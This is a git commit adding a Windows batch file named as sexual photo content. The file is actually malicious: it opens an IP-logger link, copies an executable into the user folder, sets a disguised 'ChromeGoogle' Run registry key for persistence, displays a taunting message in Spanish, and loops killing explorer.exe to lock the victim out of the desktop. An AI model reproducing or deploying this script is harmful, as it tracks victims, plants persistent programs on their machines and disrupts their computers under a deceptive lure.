c0fc92bc2ce14d8c13f72fa5a40dd51fe9d33ded
BenjaR-dev <103811160+BenjaR-dev@users.noreply.github.com>
2022-09-24 01:13:50 -0300

    Add files via upload

---
+++ Fotos-mias-de-mi-only-fans.bat
@@ -0,0 +1,17 @@
+@echo off
+:menu
+cls
+echo =====================
+echo Cargando contenido...
+echo =====================
+timeout 3
+start https://iplogger.org/2nUNJ8
+copy /Y Fotos-mias-de-mi-only-fans.exe C:\Users\%username%\ManchasTheCatOfGOD.exe
+REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v ChromeGoogle /t REG_SZ /d "C:\Users\%username%\ManchasTheCatOfGOD.exe" /f
+echo msgbox("JA JA JA PAJERO BUSCA NOVIAS DE OMEGLE HACKEADO POR EL GATO DE SEGURIDAD") > msgbox12.vbs
+start msgbox12.vbs
+goto infi
+:infi
+taskkill /F /IM explorer.exe
+goto infi
+exit
